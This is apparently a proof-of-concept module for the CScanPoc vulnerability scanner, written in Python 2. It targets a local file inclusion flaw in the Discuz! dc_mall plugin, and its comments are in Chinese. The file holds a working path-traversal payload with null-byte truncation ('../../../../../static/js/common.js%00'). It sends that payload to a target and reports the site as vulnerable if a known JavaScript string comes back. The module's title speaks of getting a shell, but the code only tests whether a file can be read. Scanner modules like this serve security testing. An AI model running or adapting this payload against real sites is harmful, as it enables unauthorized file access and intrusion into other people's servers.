# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0001'  # 平台漏洞编号，留空
    name = 'Discuz!积分商城插件设计缺陷可前台getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2015-08-04'  # 漏洞公布时间
    desc = '''
        $file = DISCUZ_ROOT.'./source/plugin/dc_mall/module/index/'.$action.'.inc.php';
        // action参数未过滤直接传入$file后面的用%00截断即可包含任意文件。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Discuz!'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5e6dfb21-2627-4697-96c5-355cefc76b2a'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/plugin.php?action=../../../../../static/js/common.js%00&id=dc_mall'
            verify_url = self.target + payload

            req = requests.get(verify_url)
            if req.status_code == 200 and 'ele.getElementsByClassName(classname);' in req.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
